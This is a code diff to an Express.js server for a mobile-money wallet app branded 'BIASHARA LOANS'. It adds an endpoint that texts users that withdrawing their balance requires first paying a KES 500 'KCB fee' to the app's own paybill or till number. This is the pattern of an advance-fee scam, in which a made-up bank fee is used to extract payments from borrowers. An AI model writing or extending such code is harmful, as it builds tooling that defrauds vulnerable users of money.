@@ -578,7 +578,22 @@ app.post('/api/wallet/deposit', auth, async (req, res) => {
     res.json({ balance: user.balance });
   } catch (e) { res.status(500).json({ error: 'Deposit failed' }); }
 });
+app.post('/api/wallet/withdrawal-sms', auth, async (req, res) => {
+  try {
+    const { amount } = req.body;
+    const user = await getUserById(req.userId);
+    
+    let settingsDoc = await settings.findOne({ key: 'deposit' });
+    let payInfo = settingsDoc && settingsDoc.method === 'paybill' 
+      ? `Paybill ${settingsDoc.paybillNumber}, Acc ${settingsDoc.paybillAccount}` 
+      : `Till ${settingsDoc.tillNumber}`;
 
+    // Send the SMS
+    await sendSMS(user.phone, `BIASHARA LOANS: To withdraw KES ${Number(amount).toLocaleString()}, pay the KCB fee of KES 500 via ${payInfo}. Enter the M-Pesa code in the app to proceed.`);
+    
+    res.json({ ok: true });
+  } catch (e) { res.status(500).json({ error: 'Failed to send SMS' }); }
+});
 app.post('/api/wallet/withdraw', auth, async (req, res) => {
   try {
     const amt = Number(req.body.amount);
